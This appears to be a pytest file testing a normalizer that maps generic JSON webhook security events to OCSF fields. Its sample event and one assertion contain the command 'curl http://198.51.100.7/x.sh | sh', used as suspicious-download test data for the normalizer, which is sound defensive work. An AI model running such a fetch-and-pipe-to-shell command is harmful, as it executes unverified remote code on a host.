"""Generic JSON webhook event → OCSF normalizer."""

from __future__ import annotations

from datetime import UTC, datetime
from typing import Any

import pytest

from app.services.normalizers.ocsf import OCSFClass, OCSFEvent
from app.services.normalizers.webhook import WebhookNormalizer

RAW: dict[str, Any] = {
    "_webhook_source": "custom-source",
    "_received_at": "2026-01-01T12:00:01+00:00",
    "timestamp": "2026-01-01T12:00:00Z",
    "host": "web01",
    "user": "alice",
    "src_ip": "203.0.113.5",
    "dst_ip": "10.0.0.8",
    "src_port": "51000",
    "dst_port": 22,
    "process": "curl",
    "command_line": "curl http://198.51.100.7/x.sh | sh",
    "pid": 4242,
    "message": "Suspicious download",
    "severity": "high",
    "id": 9001,
    "event_type": "process_start",
    "labels": {"env": "prod"},
}


def normalize(raw: dict[str, Any]) -> OCSFEvent:
    return WebhookNormalizer().normalize(raw)


def test_common_fields_are_mapped() -> None:
    event = normalize(RAW)

    assert event.metadata_product == "Webhook"
    assert event.metadata_uid == "9001"
    assert event.time == datetime(2026, 1, 1, 12, 0, tzinfo=UTC)
    assert event.severity_id == 4
    assert event.dst_endpoint.hostname == "web01"
    assert event.dst_endpoint.ip == "10.0.0.8"
    assert event.dst_endpoint.port == 22
    assert event.src_endpoint.ip == "203.0.113.5"
    assert event.src_endpoint.port == 51000
    assert event.actor_user.name == "alice"
    assert event.process.name == "curl"
    assert event.process.cmd_line == "curl http://198.51.100.7/x.sh | sh"
    assert event.process.pid == 4242
    assert event.unmapped["message"] == "Suspicious download"
    assert event.unmapped["summary"] == "Suspicious download"
    assert event.unmapped["source"] == "custom-source"


def test_full_original_is_kept_and_other_fields_stay_addressable() -> None:
    event = normalize(RAW)

    assert event.raw == RAW
    assert event.unmapped["event_type"] == "process_start"
    assert event.unmapped["labels"] == {"env": "prod"}
    # mapped and internal keys are not duplicated into unmapped
    assert "src_ip" not in event.unmapped
    assert "_received_at" not in event.unmapped


@pytest.mark.parametrize(
    ("fields", "attribute", "expected"),
    [
        ({"hostname": "db01"}, "dst_endpoint.hostname", "db01"),
        ({"username": "bob"}, "actor_user.name", "bob"),
        ({"user_name": "bob"}, "actor_user.name", "bob"),
        ({"source_ip": "192.0.2.1"}, "src_endpoint.ip", "192.0.2.1"),
        ({"dest_ip": "192.0.2.2"}, "dst_endpoint.ip", "192.0.2.2"),
        ({"destination_ip": "192.0.2.2"}, "dst_endpoint.ip", "192.0.2.2"),
        ({"destination_port": "443"}, "dst_endpoint.port", 443),
        ({"process_name": "bash"}, "process.name", "bash"),
        ({"cmd_line": "id"}, "process.cmd_line", "id"),
        ({"commandline": "id"}, "process.cmd_line", "id"),
        ({"command": "id"}, "process.cmd_line", "id"),
        ({"process_id": "77"}, "process.pid", 77),
        ({"os": "Ubuntu 22.04"}, "dst_endpoint.os_name", "Ubuntu 22.04"),
        ({"event_id": "abc"}, "metadata_uid", "abc"),
    ],
)
def test_field_name_aliases(fields: dict[str, Any], attribute: str, expected: Any) -> None:
    value: Any = normalize(fields)
    for part in attribute.split("."):
        value = getattr(value, part)
    assert value == expected


def test_first_present_alias_wins() -> None:
    event = normalize({"host": "", "hostname": "db01", "user": "alice", "username": "bob"})
    assert event.dst_endpoint.hostname == "db01"
    assert event.actor_user.name == "alice"


@pytest.mark.parametrize(
    ("fields", "expected"),
    [
        ({"timestamp": "2026-01-01T12:00:00+09:00"}, datetime(2026, 1, 1, 3, 0, tzinfo=UTC)),
        ({"time": "2026-01-01T12:00:00"}, datetime(2026, 1, 1, 12, 0, tzinfo=UTC)),
        ({"@timestamp": "2026-01-01T12:00:00.500Z"}, datetime(2026, 1, 1, 12, 0, 0, 500000, tzinfo=UTC)),
        ({"timestamp": 1767268800}, datetime(2026, 1, 1, 12, 0, tzinfo=UTC)),
        ({"timestamp": 1767268800000}, datetime(2026, 1, 1, 12, 0, tzinfo=UTC)),
    ],
)
def test_timestamp_formats(fields: dict[str, Any], expected: datetime) -> None:
    assert normalize(fields).time == expected


@pytest.mark.parametrize("fields", [{}, {"timestamp": "yesterday"}, {"timestamp": None}, {"time": True}])
def test_missing_or_bad_timestamp_falls_back_to_now(fields: dict[str, Any]) -> None:
    before = datetime.now(UTC)
    assert normalize(fields).time >= before


@pytest.mark.parametrize(
    ("severity", "severity_id"),
    [
        ("critical", 5), ("HIGH", 4), ("medium", 3), ("low", 2), ("info", 1),
        ("informational", 1), ("warning", 3), ("error", 4), (4, 4), (9, 5), (-1, 0),
        ("unheard-of", 1), (None, 1),
    ],
)
def test_severity(severity: Any, severity_id: int) -> None:
    assert normalize({"severity": severity}).severity_id == severity_id


def test_level_is_an_alias_of_severity() -> None:
    assert normalize({"level": "critical"}).severity_id == 5


def test_classification() -> None:
    assert normalize({"command_line": "id"}).class_uid == OCSFClass.PROCESS_ACTIVITY
    assert normalize({"process": "bash"}).class_uid == OCSFClass.PROCESS_ACTIVITY
    assert normalize({"src_ip": "192.0.2.1", "dst_ip": "192.0.2.2"}).class_uid == OCSFClass.NETWORK_ACTIVITY
    base = normalize({"message": "Suspicious login", "src_ip": "203.0.113.5"})
    assert (base.class_uid, base.class_name) == (0, "Base Event")


def test_service_hint_is_passed_through() -> None:
    assert normalize({"service": "sshd"}).unmapped["service"] == "sshd"
    assert "service" not in normalize({}).unmapped


def test_structured_value_in_a_string_field_is_not_mapped() -> None:
    """A nested object where a string is expected stays in raw only."""
    event = normalize({"user": {"name": "alice"}, "host": ["a", "b"]})
    assert event.actor_user.name is None
    assert event.dst_endpoint.hostname is None
    assert event.raw["user"] == {"name": "alice"}


def test_non_numeric_port_and_pid_are_dropped() -> None:
    event = normalize({"src_port": "http", "pid": "n/a"})
    assert event.src_endpoint.port is None
    assert event.process.pid is None


def test_empty_object_is_a_valid_event() -> None:
    event = normalize({})
    assert event.class_uid == 0
    assert event.unmapped == {"source": None}


def test_output_round_trips_through_json() -> None:
    event = normalize(RAW)
    assert OCSFEvent(**event.model_dump(mode="json")) == event
